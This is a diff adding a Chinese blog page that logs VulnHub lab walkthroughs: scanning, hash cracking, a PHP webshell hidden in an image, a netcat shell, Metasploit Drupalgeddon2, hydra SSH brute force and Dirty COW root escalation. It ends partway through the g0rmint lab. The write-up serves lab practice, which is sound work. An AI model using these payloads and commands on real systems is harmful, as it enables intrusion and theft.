@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          vulnhub 练习记录 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/09/vulnhub-练习记录/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#vulnhub" title="vulnhub">vulnhub</a>
+                        
+                          <a class="tag" href="/tags/#练习记录" title="练习记录">练习记录</a>
+                        
+                          <a class="tag" href="/tags/#渗透测试" title="渗透测试">渗透测试</a>
+                        
+                    </div>
+                    <h1>vulnhub 练习记录</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-09-13
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="Node-1"><a href="#Node-1" class="headerlink" title="Node 1"></a>Node 1</h1><h2 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h2><p>先用<code>arp-scan -l</code>或者<code>nmap -sP</code>扫描一下C段进行主机发现</p>
+<p>发现主机ip为<code>192.168.85.135</code></p>
+<p>然后利用nmap进行详细扫描</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sS</span> <span class="selector-tag">-T4</span> <span class="selector-tag">-A</span> <span class="selector-tag">-v</span> 192<span class="selector-class">.168</span><span class="selector-class">.85</span><span class="selector-class">.135</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/1.png" alt></p>
+<h2 id="获取源码"><a href="#获取源码" class="headerlink" title="获取源码"></a>获取源码</h2><p>访问下3000端口，是个正常的web服务</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/2.png" alt></p>
+<p>查看js文件后可以看到一些api端口，访问一下可以发现一些类似memached的字段</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/3.png" alt></p>
+<p>可以试着找一些网站解一下hash</p>
+<p>解出tom的密码为<code>spongebob</code>，尝试登录一下</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/4.png" alt></p>
+<p>似乎在说需要管理员登录，于是重新看了些api，发现<code>/api/users</code>中可以看到管理员的密码哈希值</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/5.png" alt></p>
+<p>还是可以解出，然后登录之后可以下载到一个backup文件，貌似是一些base64值可以尝试解码一下</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">base64 </span>-d myplace.<span class="keyword">backup </span>&gt; myplace</span><br></pre></td></tr></table></figure>
+<p>linux下可以直接看出是一个zip格式文件，尝试解压但似乎需要密码</p>
+<p>这时可以用kali下的一个<code>fcrackzip</code>工具尝试爆破密码</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/6.png" alt></p>
+<p>然后就可以获得网站源码了</p>
+<h2 id="getshell-amp-提升权限"><a href="#getshell-amp-提升权限" class="headerlink" title="getshell &amp; 提升权限"></a>getshell &amp; 提升权限</h2><p>可以看到是一个nodejs写的网站，在app.js中可以看到一个用户的ssh密码</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">const url</span>         = <span class="string">'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace'</span>;</span><br></pre></td></tr></table></figure>
+<p>于是就直接ssh连接即可</p>
+<p>查看一下linux版本是否可以提权</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">cat /etc/lsb-<span class="built_in">release</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/7.png" alt></p>
+<p>查看下有没有可以提权的脚本</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">searchsploit</span> <span class="selector-tag">ubuntu</span> 16<span class="selector-class">.04</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/8.png" alt></p>
+<p>挑一个44298.c来试试看</p>
+<p>在tmp目录下wget之后，编译运行即可获取到root权限</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/9.png" alt></p>
+<h1 id="ch4inrulz"><a href="#ch4inrulz" class="headerlink" title="ch4inrulz"></a>ch4inrulz</h1><h2 id="主机探测-1"><a href="#主机探测-1" class="headerlink" title="主机探测"></a>主机探测</h2><p>依旧用<code>arp-scan -l</code>可以搜索到192.168.85.136的靶机ip</p>
+<p>nmap扫一波端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T4 -A -v 192.168.85.136</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/10.png" alt></p>
+<p>可以先尝试把目标放在 <code>80</code>和<code>8011</code>两个web端口上</p>
+<h2 id="功能检测"><a href="#功能检测" class="headerlink" title="功能检测"></a>功能检测</h2><p>8011端口会显示一个开发服务</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/12.png" alt></p>
+<p>测试了下目录可以发现一个api目录</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/13.png" alt></p>
+<p>测试了下这些接口就只有files_api.php可以访问，并且可以通过post file参数进行任意文件读取</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/14.png" alt></p>
+<p>80端口一开始似乎就是个静态的页面，后期发现了一个<code>development</code>目录</p>
+<p>一开始是需要一个验证的过程，这个哈希密码需要访问<code>index.html.bak</code>中有一个带盐的哈希密码值</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/24.png" alt></p>
+<p>将这个密码通过john进行爆破，可以得到原来密码的值</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/25.png" alt></p>
+<p>然后就可以通过目录验证，登录到<code>development</code>目录中</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/15.png" alt></p>
+<p>尝试着访问下这个uploader的目录，可以看到一个文件上传的功能</p>
+<p>测试了上传一个php会对文件后缀进行拦截</p>
+<p>但是即使修改了问价后缀也会提示不是图片的格式，感觉应该是代码里检测了文件头</p>
+<p>于是就可以用copy命令，在图片后面追加一些数据</p>
+<p>1.txt内容如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> system($_POST[_]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>然后随意找一张图片，在windows下用copy命令</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/16.png" alt></p>
+<p>就可以看到文字成功追加到图片后面了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/17.png" alt></p>
+<p>然后就可以成功上传了， 还有一个问题就是不知道文件夹的名字</p>
+<p>这里看了别人的writeup发现是用一些关键字进行fuzz爆破目录（感觉脑洞是有点大，就跳了把</p>
+<p>上传的文件都在<code>/development/uploader/FRANKuploads/</code>目录下</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/18.png" alt></p>
+<h2 id="结合文件包含getshell"><a href="#结合文件包含getshell" class="headerlink" title="结合文件包含getshell"></a>结合文件包含getshell</h2><p>虽然这里无法上传一个正常的php文件，但是之前的8011端口还存在一个任意文件包含，于是可以相互结合，执行php代码</p>
+<p>这里需要进行一下简单的目录猜测</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/var/</span>www<span class="regexp">/development/u</span>ploader<span class="regexp">/FRANKuploads/</span><span class="number">2</span>.png</span><br></pre></td></tr></table></figure>
+<p>可以成功执行命令了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/19.png" alt></p>
+<p>然后就行反弹shell</p>
+<p>之前常用的本机监听端口反弹shell命令似乎无法执行。于是选择了另外一中反向连接的弹shell方式。</p>
+<p>靶机上</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/tmp_fifo</span><br><span class="line">cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l 1567 &gt; /tmp/tmp_fifo</span><br></pre></td></tr></table></figure>
+<p>本机上</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -n 192.168.85.136 1567</span><br></pre></td></tr></table></figure>
+<p>post传输的时候注意一下url编码几个，然后就可以收到反弹回来的shell</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/20.png" alt></p>
+<h2 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h2><p>更改下成bash的交互式命令行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure>
+<p>然后也查看下系统的版本号什么的</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/21.png" alt></p>
+<p>于是想试下传说中的脏牛提权（dirty cow）</p>
+<p>提权为了防止权限制，需要切换到<code>/tmp</code>目录下，下载好.c文件，然后编译运行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>
+<p>然后运行脚本，后面password为想更改的密码，默认账号为firefart</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dirty password</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/22.png" alt></p>
+<p>尝试ssh连接一下</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/23.png" alt></p>
+<p>假如实际渗透中记得将passwd备份文件还原，以免造成原账号的不可用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>至此就拿下了靶机的root权限</p>
+<p># </p>
+<h1 id="Lampiao"><a href="#Lampiao" class="headerlink" title="Lampião"></a>Lampião</h1><h2 id="主机探测-2"><a href="#主机探测-2" class="headerlink" title="主机探测"></a>主机探测</h2><p><code>arp-scan -l</code>探测一下靶机ip</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/26.png" alt></p>
+<p>可以探测到ip为192.168.85.137，再用nmap扫一波，但是这里有个问题，有一个端口<code>1898</code>端口不是常规端口，需要用nmap进行一次全局扫描</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T4 -A -v -p <span class="number">1</span><span class="number">-50000</span> <span class="number">192.168</span><span class="number">.85</span><span class="number">.137</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/27.png" alt></p>
+<p>80端口就是一个普通的静态页面，目录扫描也没扫到什么</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/28.png" alt></p>
+<p>1898端口中运行着一个Drupal服务，重点应该是在这里了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/29.png" alt></p>
+<h2 id="msf-getshell"><a href="#msf-getshell" class="headerlink" title="msf getshell"></a>msf getshell</h2><p>msf搜了一波之后可以看到一个<code>Drupal</code>2018年的exp，于是决定尝试一下</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/30.png" alt></p>
+<p>没想的居然就成功了，返回了一个msf 的shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line">show options</span><br><span class="line">set RHOST 192.168.85.137</span><br><span class="line">set RPORT 1898</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/31.png" alt></p>
+<p>输入shell之后就可以运行webshell终端了</p>
+<h2 id="爆破ssh密码-getshell"><a href="#爆破ssh密码-getshell" class="headerlink" title="爆破ssh密码 getshell"></a>爆破ssh密码 getshell</h2><p>先知上看到的别人一个骚操作，在网页上可以看到两个作者，于是便开始尝试爆破他们的ssh密码</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/32.png" alt></p>
+<p>把名字添加到<code>username.txt</code>中</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo "tiago" &gt; username.txt</span><br><span class="line">echo "Eder" &gt;&gt; username.txt</span><br></pre></td></tr></table></figure>
+<p>然后利用<code>cewl</code> 从网页中尝试生成一份密码字典（这也太叼了把。。学习了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w dict.txt http://192.168.85.137:1898/</span><br></pre></td></tr></table></figure>
+<p>然后用传说中的九头蛇<code>hydra</code>进行一下ssh密码爆破</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L username.txt -P dict.txt -f -e nsr -t 4 ssh://192.168.85.137</span><br></pre></td></tr></table></figure>
+<p>爆破过程有点慢，感觉相当不适合大规模爆破了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/33.png" alt></p>
+<p>然后就可以ssh登录了可以说思路相当清奇了</p>
+<h2 id="提升权限-1"><a href="#提升权限-1" class="headerlink" title="提升权限"></a>提升权限</h2><p>拿到shell之后查看一下版本信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tiago@lampiao:~$ uname -a</span><br><span class="line">Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span><br><span class="line">tiago@lampiao:~$ cat /etc/lsb-release </span><br><span class="line">DISTRIB_ID=Ubuntu</span><br><span class="line">DISTRIB_RELEASE=14.04</span><br><span class="line">DISTRIB_CODENAME=trusty</span><br><span class="line">DISTRIB_DESCRIPTION="Ubuntu 14.04.5 LTS"</span><br></pre></td></tr></table></figure>
+<p>14.04的，那就脏牛安排一手</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">scp root@192.168.85.134:/root/dirty.c ./</span><br><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure>
+<p>即可成功修改管理员密码，获得root权限</p>
+<h1 id="g0rmint"><a href="#g0rmint" class="headerlink" title="g0rmint"></a>g0rmint</h1><h2 id="主机探测-3"><a href="#主机探测-3" class="headerlink" title="主机探测"></a>主机探测</h2><p>先用<code>arp-scan -l</code>查看一下靶机的ip</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/34.png" alt></p>
+<p>可以确定是<code>192.168.85.139</code>的ip了，用nmap扫描一波看看开放的端口的信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T4 -A -v -p 1-50000 192.168.85.139</span><br></pre></td></tr></table></figure>
+<p>可以看到一共就开放了两个端口</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/35.png" alt></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>访问80端口之后发现返回的是404</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/36.png" alt></p>
+<p>但是nmap的扫描结果中可以看到一个robots文件，不妨先看一下</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/37.png" alt></p>
+<p>访问<code>/g0rmint/</code>页面之后是一个登录界面</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/38.png" alt></p>
+<p>尝试一波弱口令无果后，在html源代码中发现了一个奇怪的东西</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/39.png" alt></p>
+<p>访问之后依旧是404 就很苦恼了，然后用爆破了一下目录，发现了点东西</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.85.139/g0rmint/s3cretbackupdirect0ry/</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/40.png" alt></p>
+<p>里面提示了<code>backup.zip</code>，遂就能下载到源码文件了</p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>文件结构</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/41.png" alt></p>
+<p>在<code>login.php</code>中可以看到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123; <span class="comment">// If form is submitted</span></span><br><span class="line">    $email = $_POST[<span class="string">'email'</span>];</span><br><span class="line">    $pass = md5($_POST[<span class="string">'pass'</span>]);</span><br><span class="line"></span><br><span class="line">    $sql = $pdo-&gt;prepare(<span class="string">"SELECT * FROM g0rmint WHERE email = :email AND pass = :pass"</span>);</span><br><span class="line">    $sql-&gt;bindParam(<span class="string">":email"</span>, $email);</span><br><span class="line">    $sql-&gt;bindParam(<span class="string">":pass"</span>, $pass);</span><br><span class="line">    $row = $sql-&gt;execute();</span><br><span class="line">    $result = $sql-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">    <span class="keyword">if</span> (count($result) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        session_start();</span><br><span class="line">        $_SESSION[<span class="string">'username'</span>] = $result[<span class="string">'username'</span>];</span><br><span class="line">        header(<span class="string">'Location: index.php'</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $log = $email;</span><br><span class="line">        $reason = <span class="string">"Failed login attempt detected with email: "</span>;</span><br><span class="line">        addlog($log, $reason);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>登录失败的时候会生成一个日志文件<code>addlog($log, $reason);</code>，看下这个addlog的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addlog</span><span class="params">($log, $reason)</span> </span>&#123;</span><br><span class="line">    $myFile = <span class="string">"s3cr3t-dir3ct0ry-f0r-l0gs/"</span> . date(<span class="string">"Y-m-d"</span>) . <span class="string">".php"</span>;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($myFile)) &#123;</span><br><span class="line">        $fh = fopen($myFile, <span class="string">'a'</span>);</span><br><span class="line">        fwrite($fh, $reason . $log . <span class="string">"&lt;br&gt;\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $fh = fopen($myFile, <span class="string">'w'</span>);</span><br><span class="line">        fwrite($fh, file_get_contents(<span class="string">"dummy.php"</span>) . <span class="string">"&lt;br&gt;\n"</span>);</span><br><span class="line">        fclose($fh);</span><br><span class="line">        $fh = fopen($myFile, <span class="string">'a'</span>);</span><br><span class="line">        fwrite($fh, $reason . $log . <span class="string">"&lt;br&gt;\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fh);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>偏偏写在了一个<code>.php</code>的文件中，这样我们的思路就可以尝试在登录邮箱处插入一个php语句，从而任意代码执行</p>
+<p>可是在尝试去访问改文件的时候却跳转到了登录界面。</p>
+<p>最后发现是<code>fwrite($fh, file_get_contents(&quot;dummy.php&quot;) . &quot;&lt;br&gt;\n&quot;);</code>写入了一个session判断</p>
+<p>所以还是得先解决登录的问题。</p>
+<p>继续看代码，在db.sql中可以看到一条插入的数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`g0rmint`</span> (<span class="string">`id`</span>, <span class="string">`username`</span>, <span class="string">`email`</span>, <span class="string">`pass`</span>) <span class="keyword">VALUES</span></span><br><span class="line">(<span class="number">1</span>, <span class="string">'demo'</span>, <span class="string">'demo@example.com'</span>, <span class="string">'fe01ce2a7fbac8fafaed7c982a04e229'</span>);</span><br></pre></td></tr></table></figure>
+<p>解密这个哈希值之后发现是<code>demo</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/vulnhub-练习记录/42.png" alt></p>
+<p>尝试登录一波，发现似乎无法登录，可能是后期改了密码或者怎么，总之应该需要换一条登录的思路了</p>
+<p>文件中有一个重置密码的文件<code>reset.php</code></p>
